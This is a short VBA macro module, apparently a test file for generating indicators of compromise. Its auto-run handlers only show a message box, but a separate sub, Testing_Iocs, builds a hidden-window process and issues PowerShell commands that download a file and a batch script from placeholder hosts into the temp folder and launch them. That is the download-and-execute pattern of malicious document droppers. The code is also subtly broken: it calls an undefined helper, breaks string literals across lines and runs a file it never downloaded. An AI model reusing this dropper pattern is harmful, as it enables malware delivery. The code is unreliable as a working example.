Option Explicit
Sub AutoOpen()
'
' AutoOpen Macro
'

MsgBox "Hello World!"

End Sub


Private Sub Document_Open()

MsgBox "Hello World!"

End Sub

Private Sub Testing_Iocs()

Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set objStartup = objWMIService.Get("Win32_ProcessStartup")
Set objConfig = objStartup.SpawnInstance_
objConfig.ShowWindow = 0
Set objProcess = GetObject("winmgmts:\\.\root\cimv2:Win32_Process")
ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri https://www.test.example.com -OutFile $env:tmp\test.txt
Start-Process -Filepath $env:tmp\invoice.one"
ExecuteCmdAsync "cmd /c powershell Invoke-WebRequest -Uri https://www.test.com/test.bat -OutFile $env:tmp\test.bat
Start-Process -Filepath $env:tmp\test.bat"

End Sub